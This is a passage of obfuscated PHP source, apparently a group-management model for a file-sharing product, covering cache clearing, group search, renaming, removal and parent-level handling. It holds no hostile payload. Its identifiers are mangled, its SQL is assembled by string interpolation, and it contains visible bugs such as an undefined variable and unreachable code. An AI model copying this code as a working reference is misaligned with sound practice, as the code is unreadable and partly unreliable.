$this->_clearCache($‹öÉÄ¹²[$ô³ˆöë±[1951]]); $this->_clearCache($ÜÚöÁñ[$ô³ˆöë±[192]]); } } if (isset($Á¸ÛÓ¿Œ[$ô³ˆöë±[32]])) { $this->setNamePinyin($‹İÏó÷Ğ, $Á¸ÛÓ¿Œ[$ô³ˆöë±[32]]); } if (isset($Á¸ÛÓ¿Œ[$ô³ˆöë±[2041]])) { $this->metaSet($‹İÏó÷Ğ, array($ô³ˆöë±[2041] => $Á¸ÛÓ¿Œ[$ô³ˆöë±[2041]], $ô³ˆöë±[2042] => $Á¸ÛÓ¿Œ[$ô³ˆöë±[2042]])); unset($Á¸ÛÓ¿Œ[$ô³ˆöë±[2041]]); unset($Á¸ÛÓ¿Œ[$ô³ˆöë±[2042]]); } $this->_clearChildrenCache($ÜÚöÁñ); return $this->where(array($ô³ˆöë±[2043] => $‹İÏó÷Ğ))->save($Á¸ÛÓ¿Œ); } private function _clearChildrenCache($µÊ¥Òª) { $¶¶éÛ™ª =& $_SERVER[‹è™Ü¸Ñ]; $’úÛºì = array($¶¶éÛ™ª[652] => array($¶¶éÛ™ª[612], $µÊ¥Òª[$¶¶éÛ™ª[584]] . $µÊ¥Òª[$¶¶éÛ™ª[1951]] . $¶¶éÛ™ª[613])); $Æœ¶ğ±Ú = $this->field($¶¶éÛ™ª[1951])->where($’úÛºì)->select(); foreach ($Æœ¶ğ±Ú as $Îé‘±å¨) { $this->_clearCache($Îé‘±å¨[$¶¶éÛ™ª[1951]]); } } private function _clearCache($Ú­ë¼…Õ) { $ƒ°ä£µ =& $_SERVER[‹è™Ü¸Ñ]; $this->cacheFunctionClear($ƒ°ä£µ[2037], $Ú­ë¼…Õ); $this->cacheFunctionClear($ƒ°ä£µ[2038], $Ú­ë¼…Õ); } private function _changeChildLevel($ì³ş“ú¢, $›¨üœ£î, $ûÄı¾¸ä = false) { $ÒÀÂ…°ä =& $_SERVER[‹è™Ü¸Ñ]; $Šü’”î = $ì³ş“ú¢[$ÒÀÂ…°ä[584]] . $ì³ş“ú¢[$ÒÀÂ…°ä[1951]] . $ÒÀÂ…°ä[50]; $°Ô°ªâÌ = $›¨üœ£î[$ÒÀÂ…°ä[584]] . $›¨üœ£î[$ÒÀÂ…°ä[1951]] . $ÒÀÂ…°ä[50] . $ì³ş“ú¢[$ÒÀÂ…°ä[1951]] . $ÒÀÂ…°ä[50]; if ($ûÄı¾¸ä) { $°Ô°ªâÌ = $›¨üœ£î[$ÒÀÂ…°ä[584]] . $›¨üœ£î[$ÒÀÂ…°ä[1951]] . $ÒÀÂ…°ä[50]; } $İ«ôş¥˜ = array($ÒÀÂ…°ä[652] => array($ÒÀÂ…°ä[612], $ì³ş“ú¢[$ÒÀÂ…°ä[584]] . $ì³ş“ú¢[$ÒÀÂ…°ä[1951]] . $ÒÀÂ…°ä[613])); $ÊÑ™§ = array($ÒÀÂ…°ä[652] => array($ÒÀÂ…°ä[661], "\x72\145\x70\x6c\x61\143\145\50\160\x61\162\145\x6e\164\x4c\x65\166\145\154\x2c\x27{$Šü’”î}\x27\x2c\47{$°Ô°ªâÌ}\47\x29")); $this->_clearChildrenCache($ì³ş“ú¢); $this->where($İ«ôş¥˜)->data($ÊÑ™§)->save(); } public function setNamePinyin($‰‰©ªâ¯, $îàÙ‚§æ = false) { $ˆëì÷¦„ =& $_SERVER[‹è™Ü¸Ñ]; if (!$îàÙ‚§æ) { $¬ÁéçİÏ = $this->getInfoSimple($‰‰©ªâ¯); $îàÙ‚§æ = $¬ÁéçİÏ[$ˆëì÷¦„[32]]; } if (!Input::check($îàÙ‚§æ, $ˆëì÷¦„[655])) { $this->metaSet($‰‰©ªâ¯, $ˆëì÷¦„[538], null); $this->metaSet($‰‰©ªâ¯, $ˆëì÷¦„[537], null); return; } $Î¯²Äˆ¾ = array($ˆëì÷¦„[538] => str_replace($ˆëì÷¦„[53], $ˆëì÷¦„[12], Pinyin::get($îàÙ‚§æ)), $ˆëì÷¦„[537] => Pinyin::get($îàÙ‚§æ, $ˆëì÷¦„[656])); $this->metaSet($‰‰©ªâ¯, $Î¯²Äˆ¾); } protected function groupStatus($ÇµœÛ ç, $ö®Î§ÊÁ) { $€•÷ß†¾ =& $_SERVER[‹è™Ü¸Ñ]; $‰öî¢ = $this->getInfoSimple($ÇµœÛ ç); if (!$‰öî¢) { return !1; } $this->_clearCache($ÇµœÛ ç); return $this->metaSet($ÇµœÛ ç, $€•÷ß†¾[805], $ö®Î§ÊÁ); if ($ö®Î§ÊÁ == $€•÷ß†¾[91]) { $Í²ü‡ÂÁ = $this->parentLevelArray($‰öî¢[$€•÷ß†¾[584]]); } else { } $Í²ü‡ÂÁ[] = $‰öî¢[$€•÷ß†¾[1951]]; $£ˆÇ¼¥¢ = array(); foreach ($Í²ü‡ÂÁ as $ÇµœÛ ç) { $£ˆÇ¼¥¢[] = array($€•÷ß†¾[1951] => $ÇµœÛ ç, $€•÷ß†¾[97] => $€•÷ß†¾[805], $€•÷ß†¾[450] => $ö®Î§ÊÁ); $this->_clearCache($ÇµœÛ ç); } return Model($€•÷ß†¾[2044])->addAll($£ˆÇ¼¥¢, array(), !0); } protected function groupRemove($¤½‚×õ‡, $éË»–ß = false) { $Ğ¥ÁËçÕ =& $_SERVER[‹è™Ü¸Ñ]; $¢íŒ³± = array($Ğ¥ÁËçÕ[1951] => $¤½‚×õ‡); $ŸØÁ²Ô” = $this->where($¢íŒ³±)->find(); if (!$ŸØÁ²Ô” || $ŸØÁ²Ô”[$Ğ¥ÁËçÕ[192]] == 0) { return !1; } if (!$éË»–ß) { $ß£ğì = $this->getInfoSimple($ŸØÁ²Ô”[$Ğ¥ÁËçÕ[192]]); $this->_changeChildLevel($ŸØÁ²Ô”, $ß£ğì, !0); $this->where(array($Ğ¥ÁËçÕ[192] => $¤½‚×õ‡))->save(array($Ğ¥ÁËçÕ[192] => $ŸØÁ²Ô”[$Ğ¥ÁËçÕ[192]])); $this->_clearCache($ß£ğì[$Ğ¥ÁËçÕ[1951]]); } Model($Ğ¥ÁËçÕ[2044])->where($¢íŒ³±)->delete(); Model($Ğ¥ÁËçÕ[2045])->where($¢íŒ³±)->delete(); Model($Ğ¥ÁËçÕ[879])->groupRootRemove($¤½‚×õ‡); $this->_clearCache($ŸØÁ²Ô”[$Ğ¥ÁËçÕ[192]]); return $this->where($¢íŒ³±)->delete(); } protected function groupSort($„ÜêÔİ¦) { $ù³¶›‰ =& $_SERVER[‹è™Ü¸Ñ]; $“Ô÷”€¢ = array(); foreach ($„ÜêÔİ¦ as $é€¼©‹­ => $º¤ùöĞÜ) { $“Ô÷”€¢[] = array($ù³¶›‰[1951], $º¤ùöĞÜ, $ù³¶›‰[1975], $é€¼©‹­ + 1); } $this->saveAll($“Ô÷”€¢); } public function listData() { $Ÿâ‘İÏ” = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ÿâ‘İÏ”[$_SERVER[‹è™Ü¸Ñ][445]]); return $Ÿâ‘İÏ”; } private function _makeOrder($ñß’ú¦Ø = '') { $¦›Ú±Ü£ =& $_SERVER[‹è™Ü¸Ñ]; $Ù·Ÿİâß = array($¦›Ú±Ü£[1951], $¦›Ú±Ü£[32], $¦›Ú±Ü£[1939], $¦›Ú±Ü£[231]); $²ÌÜôñ¶ = array($¦›Ú±Ü£[523] => $¦›Ú±Ü£[524], $¦›Ú±Ü£[525] => $¦›Ú±Ü£[526]); $¼İüÈå× = Input::get($¦›Ú±Ü£[530], $¦›Ú±Ü£[7], $¦›Ú±Ü£[1955], $Ù·Ÿİâß); $¶®ƒıÔÎ = Input::get($¦›Ú±Ü£[531], $¦›Ú±Ü£[7], $¦›Ú±Ü£[2046], array($¦›Ú±Ü£[2046], $¦›Ú±Ü£[525])); $¶®ƒıÔÎ = $²ÌÜôñ¶[$¶®ƒıÔÎ]; $ñß’ú¦Ø = $ñß’ú¦Ø . "{$¼İüÈå×}\x20{$¶®ƒıÔÎ}\54\40\147\162\157\x75\160\111\104\40\x61\163\143"; return $this->order($ñß’ú¦Ø); } public function listChild($×±©ºÚ¥) { $èÕ­¬Áè =& $_SERVER[‹è™Ü¸Ñ]; $²¡ä·”á = $this->where(array($èÕ­¬Áè[192] => $×±©ºÚ¥))->_makeOrder()->selectPage(200); $this->_listDataApply($²¡ä·”á[$èÕ­¬Áè[445]]); return $²¡ä·”á; } public function listChildIds($Ë¾ÔüÙ«) { $±‰­¶„ =& $_SERVER[‹è™Ü¸Ñ]; if (is_string($Èıé¯)) { $Ë¾ÔüÙ« = explode($±‰­¶„[50], $Ë¾ÔüÙ«); } $åêÔÊÇÃ = $this->where(array($±‰­¶„[1951] => array($±‰­¶„[7], $Ë¾ÔüÙ«)))->field($±‰­¶„[2047])->select(); if (!$åêÔÊÇÃ) { return !1; } $ìˆ«ØŒ© = array(); foreach ($åêÔÊÇÃ as $­Û°—™) { $ìˆ«ØŒ©[] = "\163\145\x6c\145\143\x74\40\147\x72\x6f\x75\160\x49\x44\x20\146\162\157\x6d\40\140\x67\162\x6f\x75\160\x60\x20\167\150\145\x72\145\40\160\x61\162\145\x6e\164\114\x65\166\x65\154\x20\x6c\151\153\145\x20\47{$­Û°—™[$±‰­¶„[584]]}{$­Û°—™[$±‰­¶„[1951]]}\54\x25\x27"; } $ìˆ«ØŒ© = implode($±‰­¶„[2048], $ìˆ«ØŒ©); $åêÔÊÇÃ = $this->query($ìˆ«ØŒ©); if (!$åêÔÊÇÃ) { return array(); } $Ë¾ÔüÙ« = array_to_keyvalue($åêÔÊÇÃ, $±‰­¶„[12], $±‰­¶„[1951]); return array_unique($Ë¾ÔüÙ«); } public function listByID($¡Ï×Èş) { $øæŠê¤Ã =& $_SERVER[‹è™Ü¸Ñ]; if (!$¡Ï×Èş) { return array(); } $íöæ¾†Š = array($øæŠê¤Ã[1951] => array($øæŠê¤Ã[7], $¡Ï×Èş)); $³ìÀŸ¡ş = $this->where($íöæ¾†Š)->select(); $³ìÀŸ¡ş = array_sort_keep($³ìÀŸ¡ş, $øæŠê¤Ã[1951], $¡Ï×Èş); $this->_listDataApply($³ìÀŸ¡ş); return $³ìÀŸ¡ş; } public function listSearch($ñ›öØÓÑ) { $éÁéÉŞ§ =& $_SERVER[‹è™Ü¸Ñ]; $Œöòğ‡Ş = trim($ñ›öØÓÑ[$éÁéÉŞ§[2049]]); $ö¿ÂÅ = explode($éÁéÉŞ§[53], $Œöòğ‡Ş); if (!$Œöòğ‡Ş || count($ö¿ÂÅ) == 1) { return $this->listSearchNow($ñ›öØÓÑ); } $¹§úàÁœ = array($éÁéÉŞ§[445] => array()); foreach ($ö¿ÂÅ as $ƒØµÆÏõ) { if (!trim($ƒØµÆÏõ)) { continue; } $ñ›öØÓÑ[$éÁéÉŞ§[2049]] = $ƒØµÆÏõ; $ñç¾‰Ó· = $this->listSearchNow($ñ›öØÓÑ); $¹§úàÁœ[$éÁéÉŞ§[445]] = array_merge($¹§úàÁœ[$éÁéÉŞ§[445]], $ñç¾‰Ó·[$éÁéÉŞ§[445]]); } $¹§úàÁœ[$éÁéÉŞ§[445]] = array_unique_by_key($¹§úàÁœ[$éÁéÉŞ§[445]], $éÁéÉŞ§[1951]); $¹§úàÁœ[$éÁéÉŞ§[442]] = array($éÁéÉŞ§[443] => count($¹§úàÁœ[$éÁéÉŞ§[445]]), $éÁéÉŞ§[439] => 20, $éÁéÉŞ§[429] => 1, $éÁéÉŞ§[444] => 1); return $¹§úàÁœ; } public function listSearchNow($Öâ‘ç¼†) { $Äìşµ£® =& $_SERVER[‹è™Ü¸Ñ]; $çãÌ÷¦¤ = trim($Öâ‘ç¼†[$Äìşµ£®[2049]]); $×ßøŒ¶» = isset($Öâ‘ç¼†[$Äìşµ£®[2050]]) ? $Öâ‘ç¼†[$Äìşµ£®[2050]] : !1; if (!trim($çãÌ÷¦¤)) { return !1; } $çãÌ÷¦¤ = str_replace($Äìşµ£®[2051], $Äìşµ£®[2052], $çãÌ÷¦¤); $ª Ì ‰ = array($Äìşµ£®[1951] => array($Äìşµ£®[459], "{$çãÌ÷¦¤}\45"), $Äìşµ£®[32] => array($Äìşµ£®[459], "\x25{$çãÌ÷¦¤}\x25"), $Äìşµ£®[1058] => $Äìşµ£®[2053]); if ($×ßøŒ¶») { $„¢›å¸« = $this->getInfoSimple($×ßøŒ¶»); $õŠÜ± = $„¢›å¸«[$Äìşµ£®[584]] . $×ßøŒ¶» . $Äìşµ£®[613]; $ª Ì ‰ = array($ª Ì ‰, array($Äìşµ£®[584] => array($Äìşµ£®[459], $õŠÜ±))); } $ª Ì ‰ = $this->parseWhereLike($ª Ì ‰); $ÌÒ£ß«¡ = $this->_makeOrder()->where($ª Ì ‰)->selectPage(20); $ÌÒ£ß«¡ = $ÌÒ£ß«¡ ? $ÌÒ£ß«¡ : array($Äìşµ£®[445] => array(), $Äìşµ£®[442] => array()); if (!$ÌÒ£ß«¡ || count($ÌÒ£ß«¡[$Äìşµ£®[445]]) < 5 && Input::check($çãÌ÷¦¤, $Äìşµ£®[394])) { $ìÆ«òèÎ = $this->groupChildrenAll($×ßøŒ¶»); $ªì³ããŠ = $this->_searchFromMeta($Äìşµ£®[537], $çãÌ÷¦¤, 10, $ìÆ«òèÎ); $ó«´§ŞÊ = $this->_searchFromMeta($Äìşµ£®[538], $çãÌ÷¦¤, 10, $ìÆ«òèÎ); $»ÄãŸÒÕ = array_merge($ªì³ããŠ, $ó«´§ŞÊ, $ÌÒ£ß«¡[$Äìşµ£®[445]]); $ÌÒ£ß«¡[$Äìşµ£®[445]] = array_unique_by_key($»ÄãŸÒÕ, $Äìşµ£®[1951]); $ÌÒ£ß«¡[$Äìşµ£®[442]][$Äìşµ£®[443]] = count($ÌÒ£ß«¡[$Äìşµ£®[445]]); $ÌÒ£ß«¡[$Äìşµ£®[442]][$Äìşµ£®[444]] = ceil($ÌÒ£ß«¡[$Äìşµ£®[442]][$Äìşµ£®[443]] / $ÌÒ£ß«¡[$Äìşµ£®[442]][$Äìşµ£®[439]]); } $this->_listDataApply($ÌÒ£ß«¡[$Äìşµ£®[445]]); return $ÌÒ£ß«¡; } protected function groupChildrenAll($™ÔÈ‰–â) { $œúÜµ‚° =& $_SERVER[‹è™Ü¸Ñ]; if (!$™ÔÈ‰–â) { return !1; } if (!is_array($™ÔÈ‰–â)) { $™ÔÈ‰–â = array($™ÔÈ‰–â); } $§›œçƒ¡ = $™ÔÈ‰–â; foreach ($™ÔÈ‰–â as $¬°õ£›ş) { $‡÷¸ıÉÏ = $this->getInfoSimple($¬°õ£›ş); $ñï¿ùˆ÷ = array($œúÜµ‚°[584] => array($œúÜµ‚°[459], $‡÷¸ıÉÏ[$œúÜµ‚°[584]] . $¬°õ£›ş . $œúÜµ‚°[613])); $ª—ôÛµş = $this->field($œúÜµ‚°[1951])->where($ñï¿ùˆ÷)->select(); $§›œçƒ¡ = array_merge($§›œçƒ¡, array_to_keyvalue($ª—ôÛµş, $œúÜµ‚°[12], $œúÜµ‚°[1951])); } return array_unique($§›œçƒ¡); } private function _searchFromMeta($Ş„°ó“Õ, $ø¬ØÜÆé, $ïØÂ§ş±, $ÏëùÊñ¬) { $ÅÁ½®¤¤ =& $_SERVER[‹è™Ü¸Ñ]; $ø¬ØÜÆé = strtolower($ø¬ØÜÆé); $ìášÇ÷ = array($ÅÁ½®¤¤[97] => $Ş„°ó“Õ, $ÅÁ½®¤¤[450] => array($ÅÁ½®¤¤[459], "\x25{$ø¬ØÜÆé}\45")); $ìášÇ÷ = $this->parseWhereLike($ìášÇ÷); if ($ÏëùÊñ¬) { $ìášÇ÷[$ÅÁ½®¤¤[1951]] = array($ÅÁ½®¤¤[7], $ÏëùÊñ¬); } $²üµ­÷Ğ = Model($ÅÁ½®¤¤[2054])->where($ìášÇ÷)->limit($ïØÂ§ş±)->select(); if (!$²üµ­÷Ğ) { return array(); } $²üµ­÷Ğ = array_to_keyvalue($²üµ­÷Ğ, $ÅÁ½®¤¤[12], $ÅÁ½®¤¤[1951]); $Ğ–Õ«¯† = $this->where(array($ÅÁ½®¤¤[2043] => array($ÅÁ½®¤¤[7], $²üµ­÷Ğ)))->select(); if (!$Ğ–Õ«¯†) { return array(); } return $Ğ–Õ«¯†; } protected function _listDataApplyItem($àÒå•ÓÏ) { $ğ ­öÉÄ = array($àÒå•ÓÏ); $this->_listDataApply($ğ ­öÉÄ); return $ğ ­öÉÄ[0]; } protected function _listDataApply(&$ÆéÇÆ¯¯) { $öÅò·…Ë =& $_SERVER[‹è™Ü¸Ñ]; if (!$ÆéÇÆ¯¯) { return; } $óĞëº¬œ = array_to_keyvalue($ÆéÇÆ¯¯, $öÅò·…Ë[12], $öÅò·…Ë[1951]); $this->_listAppendChildren($ÆéÇÆ¯¯); $this->_listAppendChildrenMember($ÆéÇÆ¯¯); $this->_listAppendMeta($ÆéÇÆ¯¯, $óĞëº¬œ); $this->_listAppendParent($ÆéÇÆ¯¯); $this->_listAppendSourceRoot($ÆéÇÆ¯¯, $óĞëº¬œ); } private function _listAppendChildren(&$ö¼‚§‡È) { $îÁ–ó±‚ =& $_SERVER[‹è™Ü¸Ñ]; $ğù±˜  = array_to_keyvalue($ö¼‚§‡È, $îÁ–ó±‚[12], $îÁ–ó±‚[1951]); $ÂŠïô‰ˆ = array($îÁ–ó±‚[192] => array($îÁ–ó±‚[7], $ğù±˜ )); $ğåŞˆ²ó = array($îÁ–ó±‚[192], $îÁ–ó±‚[2055] => $îÁ–ó±‚[565]); $ªÂÂæ°« = $this->field($ğåŞˆ²ó)->where($ÂŠïô‰ˆ)->group($îÁ–ó±‚[192])->select(); $¯öâ¬Æ° = array_to_keyvalue($ªÂÂæ°«, $îÁ–ó±‚[192], $îÁ–ó±‚[565]); foreach ($ö¼‚§‡È as &$¸² ×èÃ) { $í™æëÃğ = $¸² ×èÃ[$îÁ–ó±‚[1951]]; $¸² ×èÃ[$îÁ–ó±‚[2056]] = isset($¯öâ¬Æ°[$í™æëÃğ]) ? intval($¯öâ¬Æ°[$í™æëÃğ]) : !1; } unset($¸² ×èÃ); } private function _listAppendChildrenMember(&$¹€ÄÜ î) { $ÔÀ©Á¡£ =& $_SERVER[‹è™Ü¸Ñ]; $Òñá–õ› = array_to_keyvalue($¹€ÄÜ î, $ÔÀ©Á¡£[12], $ÔÀ©Á¡£[1951]); $›Ÿ£åÜ« = array($ÔÀ©Á¡£[1951] => array($ÔÀ©Á¡£[7], $Òñá–õ›)); $’Ôªè¥ = array($ÔÀ©Á¡£[1951], $ÔÀ©Á¡£[2055] => $ÔÀ©Á¡£[565]); $æîÉßé = Model($ÔÀ©Á¡£[2045])->field($’Ôªè¥)->where($›Ÿ£åÜ«)->group($ÔÀ©Á¡£[1951])->select(); $á®ÓËŸİ = array_to_keyvalue($æîÉßé, $ÔÀ©Á¡£[1951], $ÔÀ©Á¡£[565]); foreach ($¹€ÄÜ î as &$‹åÍĞ°¡) { $Ş§ûˆ²‘ = $‹åÍĞ°¡[$ÔÀ©Á¡£[1951]]; $‹åÍĞ°¡[$ÔÀ©Á¡£[2057]] = isset($á®ÓËŸİ[$Ş§ûˆ²‘]) ? intval($á®ÓËŸİ[$Ş§ûˆ²‘]) : !1; } unset($‹åÍĞ°¡); } private function _listAppendMeta(&$Í²ï¤Ï, $ğÊ˜ˆ®Ø) { $â”ñË‘™ =& $_SERVER[‹è™Ü¸Ñ]; $¹èÏù‚ = array($â”ñË‘™[1951] => array($â”ñË‘™[7], $ğÊ˜ˆ®Ø)); $ÃâÚ°è = Model($â”ñË‘™[2044])->where($¹èÏù‚)->select(); $ÃâÚ°è = array_to_keyvalue_group($ÃâÚ°è, $â”ñË‘™[1951]); foreach ($ÃâÚ°è as &$¾¥Ù›Å›) { $¾¥Ù›Å› = array_to_keyvalue($¾¥Ù›Å›, $â”ñË‘™[97], $â”ñË‘™[450]); } unset($¾¥Ù›Å›); foreach ($Í²ï¤Ï as &$»Ü™éşÃ) { $»Ü™éşÃ[$â”ñË‘™[539]] = array(); if (isset($ÃâÚ°è[$»Ü™éşÃ[$â”ñË‘™[1951]]])) { $»Ü™éşÃ[$â”ñË‘™[539]] = $ÃâÚ°è[$»Ü™éşÃ[$â”ñË‘™[1951]]]; } } unset($»Ü™éşÃ); } protected function parentLevelArray($ÊÁªó¬€) { $×Úü¦¾ =& $_SERVER[‹è™Ü¸Ñ]; $ÊÁªó¬€ = explode($×Úü¦¾[50], trim($ÊÁªó¬€, $×Úü¦¾[50])); $ÊÁªó¬€ = array_remove_value($ÊÁªó¬€, $×Úü¦¾[228]); return $ÊÁªó¬€; } protected function parentInGroup($ÖÉÂ«Şù, $ÃÂ¨Ğ§À) { $Û‹ÂŞĞë =& $_SERVER[‹è™Ü¸Ñ]; $àŸğô¦Ô = $this->getInfoSimple($ÖÉÂ«Şù); if (!$àŸğô¦Ô) { return !0; } $­­é½œ = $this->parentLevelArray($àŸğô¦Ô[$Û‹ÂŞĞë[584]]); $­­é½œ[] = $ÖÉÂ«Şù; foreach ($­­é½œ as $ÖÉÂ«Şù) { if (in_array($ÖÉÂ«Şù . $Û‹ÂŞĞë[12], $ÃÂ¨Ğ§À)) { return !0; } } return !1; } private function _listAppendParent(&$’²ß™Ã§) { $¼Ïı£ù =& $_SERVER[‹è™Ü¸Ñ]; $¢¾Ï¼¸• = array(); foreach ($’²ß™Ã§ as &$Ÿ¿›¶Òä) { $¢¾Ï¼¸•[$Ÿ¿›¶Òä[$¼Ïı£ù[1951]]] = $Ÿ¿›¶Òä[$¼Ïı£ù[32]]; $ÌæÖ×÷¹ = $this->parentLevelArray($Ÿ¿›¶Òä[$¼Ïı£ù[584]]); foreach ($ÌæÖ×÷¹ as $‚Ş¶¹™Ë) { if (!isset($¢¾Ï¼¸•[$‚Ş¶¹™Ë])) { $¢¾Ï¼¸•[$‚Ş¶¹™Ë] = 0; } } } unset($Ÿ¿›¶Òä); foreach ($¢¾Ï¼¸• as $ıËïĞªº => $ïâò»…¨) { if ($ïâò»…¨) { continue; } $®‡Û÷ı = $this->getInfoSimple($ıËïĞªº); $¢¾Ï¼¸•[$ıËïĞªº] = $®‡Û÷ı[$¼Ïı£ù[32]]; } $¯ŠÓ¤–İ = $GLOBALS[$¼Ïı£ù[6]][$¼Ïı£ù[92]][$¼Ïı£ù[2058]]; if (KodUser::isRoot()) { $¯ŠÓ¤–İ = !1; } foreach ($’²ß™Ã§ as &$Ÿ¿›¶Òä) { $ÌæÖ×÷¹ = $this->parentLevelArray($Ÿ¿›¶Òä[$¼Ïı£ù[584]]); $”±›ß‚Ç = $¼Ïı£ù[12]; foreach ($ÌæÖ×÷¹ as $ıËïĞªº => $‚Ş¶¹™Ë) { if ($¯ŠÓ¤–İ && $ıËïĞªº == 0) { continue; } $”±›ß‚Ç .= $¢¾Ï¼¸•[$‚Ş¶¹™Ë] . $¼Ïı£ù[8]; } if ($ÌæÖ×÷¹) { $”±›ß‚Ç .= $Ÿ¿›¶Òä[$¼Ïı£ù[32]]; } $Ÿ¿›¶Òä[$¼Ïı£ù[589]] = str_replace($¼Ïı£ù[592], $¼Ïı£ù[8], $”±›ß‚Ç); } unset($Ÿ¿›¶Òä); } private function _listAppendSourceRoot(&$‘Á›‹§Ø, $ç’ã³€¯) { $€¼›¹†ë =& $_SERVER[‹è™Ü¸Ñ]; $Ø˜û€ú— = Model($€¼›¹†ë[879])->listSourceRoot(SourceModel::TYPE_GROUP, $ç’ã³€¯); $Ø˜û€ú— = array_to_keyvalue($Ø˜û€ú—, $€¼›¹†ë[569]); $Ø˜û€ú— = array_remove_key($Ø˜û€ú—, $€¼›¹†ë[569]); foreach ($‘Á›‹§Ø as &$ÓøË¸ƒ‘) { $ÓøË¸ƒ‘[$€¼›¹†ë[90]] = $Ø˜û€ú—[$ÓøË¸ƒ‘[$€¼›¹†ë[1951]]] ? $Ø˜û€ú—[$ÓøË¸ƒ‘[$€¼›¹†ë[1951]]] : array(); } unset($ÓøË¸ƒ‘); } protected function groupMerge($¹©¾Ëí‘) { $¹©¾Ëí‘ = array_values(array_unique($¹©¾Ëí‘)); $‰§Ğ¼éú = array(); for ($¦šÉå“« = 0; $¦šÉå“« < count($¹©¾Ëí‘); $¦šÉå“«++) { $‰Ø±¤Œä = !1; for ($Á¨¥œÑ = 0; $Á¨¥œÑ < count($¹©¾Ëí‘); $Á¨¥œÑ++) { if ($¦šÉå“« == $Á¨¥œÑ) { continue; } if ($this->isParentOf($¹©¾Ëí‘[$Á¨¥œÑ], $¹©¾Ëí‘[$¦šÉå“«])) { $‰Ø±¤Œä = !0; break; } } if (!$‰Ø±¤Œä) { $‰§Ğ¼éú[] = $¹©¾Ëí‘[$¦šÉå“«]; } } return $‰§Ğ¼éú; } protected function isParentOf($Ïï’Ñ¹, $ä¬…ˆ‹Œ) { $æÕ›õ‡ =& $_SERVER[‹è™Ü¸Ñ]; if (!$Ïï’Ñ¹ || !$ä¬…ˆ‹Œ || $Ïï’Ñ¹ == $ä¬…ˆ‹Œ) { return !1; } $…ÙîÆ†û = $this->getInfoSimple($Ïï’Ñ¹); $ü¶İˆÓ— = $this->getInfoSimple($ä¬…ˆ‹Œ); $Ë™ùÖ›ù = $…ÙîÆ†û[$æÕ›õ‡[584]] . $Ïï’Ñ¹ . $æÕ›õ‡[50]; if (substr($ü¶İˆÓ—[$æÕ›õ‡[584]], 0, strlen($Ë™ùÖ›ù)) == $Ë™ùÖ›ù) { return !0; } return !1; } public function groupShowRoot($öÉ²¤¹ï, $­«°ÆØ¬ = false) { $ñÙÓİÃö =& $_SERVER[‹è™Ü¸Ñ]; $ÚõÙ¶¢š = $this->getInfo($öÉ²¤¹ï); if (!$ÚõÙ¶¢š) { return array(); } $½·™ôÇ£ = $this->parentLevelArray($ÚõÙ¶¢š[$ñÙÓİÃö[584]]); $É÷úÎµ° = array($öÉ²¤¹ï); if (count($½·™ôÇ£) == 0) { return $É÷úÎµ°; } if ($­«°ÆØ¬ && count($½·™ôÇ£) == 1) { return $É÷úÎµ°; } if (!$ÚõÙ¶¢š[$ñÙÓİÃö[539]] || !isset($ÚõÙ¶¢š[$ñÙÓİÃö[539]][$ñÙÓİÃö[2041]]) || $ÚõÙ¶¢š[$ñÙÓİÃö[539]][$ñÙÓİÃö[2041]] == $ñÙÓİÃö[831]) { return $this->groupShowRoot($½·™ôÇ£[count($½·™ôÇ£) - 1], $­«°ÆØ¬); } if ($ÚõÙ¶¢š[$ñÙÓİÃö[539]][$ñÙÓİÃö[2041]] == $ñÙÓİÃö[433]) { $µšÇÈ’¾ = explode($ñÙÓİÃö[50], $ÚõÙ¶¢š[$ñÙÓİÃö[539]][$ñÙÓİÃö[2042]]); if ($µšÇÈ’¾) { $É÷úÎµ° = array_merge($É÷úÎµ°, $µšÇÈ’¾); } } return $É÷úÎµ°; } protected function resetParentLevel() { $Æé¡÷“¢ =& $_SERVER[‹è™Ü¸Ñ]; $™œ† = $Æé¡÷“¢[1951]; $¡œÜí® = $this->select(); $¡œÜí® = array_to_keyvalue($¡œÜí®, $™œ†); foreach ($¡œÜí® as $Œ¬²ªÈ») { $Ø‰îĞ  = $Œ¬²ªÈ»; $›¼¨×İÛ = array(); while ($Ø‰îĞ [$Æé¡÷“¢[192]] != 0) { $›¼¨×İÛ[] = $Ø‰îĞ [$Æé¡÷“¢[192]]; $Ø‰îĞ  = $¡œÜí®[$Ø‰îĞ [$Æé¡÷“¢[192]]]; } $›¼¨×İÛ[] = 0; $›¼¨×İÛ = $Æé¡÷“¢[50] . implode($Æé¡÷“¢[50], array_reverse($›¼¨×İÛ)) . $Æé¡÷“¢[50]; $this->setNamePinyin($Œ¬²ªÈ»[$™œ†], $Œ¬²ªÈ»[$Æé¡÷“¢[32]]); $this->where(array($™œ† => $Œ¬²ªÈ»[$™œ†]))->save(array($Æé¡÷“¢[652] => $›¼¨×İÛ)); } return $¡œÜí®; } public function groupNameAuto($€¤™É˜é, $Ãœ›ÈÛ) { $†³éÛ…‹ =& $_SERVER[‹è™Ü¸Ñ]; $Â±…­¿ = $this->where(array($†³éÛ…‹[477] => $€¤™É˜é))->getField($†³éÛ…‹[32], !0); if (!$Â±…­¿ || !in_array($Ãœ›ÈÛ, $Â±…­¿)) { return $Ãœ›ÈÛ; } for ($¾—¨î­ = 1; $¾—¨î­ <= count($Â±…­¿) + 1; $¾—¨î­++) { $öÔìÈâ = $Ãœ›ÈÛ . "\x28{$¾—¨î­}\51"; if (!in_array($öÔìÈâ, $Â±…­¿)) { return $öÔìÈâ; } } } public function groupSwitch($ª€€¨‡Ä, $…Ì‘‹º“) { $àüê±¬ =& $_SERVER[‹è™Ü¸Ñ]; $œÖ½Ó†Å = array($àüê±¬[1951] => array($àüê±¬[7], array($ª€€¨‡Ä, $…Ì‘‹º“))); $“üãÊæ‘ = $this->where($œÖ½Ó†Å)->select(); $“üãÊæ‘ = array_to_keyvalue($“üãÊæ‘, $àüê±¬[1951]); if (!isset($“üãÊæ‘[$ª€€¨‡Ä]) || !isset($“üãÊæ‘[$…Ì‘‹º“]) || $“üãÊæ‘[$ª€€¨‡Ä][$àüê±¬[192]] == 0) { return !1; } $œÖ½Ó†Å = array($àüê±¬[1951] => $ª€€¨‡Ä); $Õ‹ëÉà = Model($àüê±¬[2045])->where($œÖ½Ó†Å)->select(); if (!$Õ‹ëÉà) { $Õ‹ëÉà = array(); } foreach ($Õ‹ëÉà as $¤º¡¤) { $¾À•Ç±ö = $¤º¡¤[$àüê±¬[1752]]; $œÖ½Ó†Å = array($àüê±¬[1752] => $¾À•Ç±ö, $àüê±¬[1951] => $…Ì‘‹º“); $¹±’€®Ã = Model($àüê±¬[2045])->where($œÖ½Ó†Å)->find(); if (!$¹±’€®Ã) { 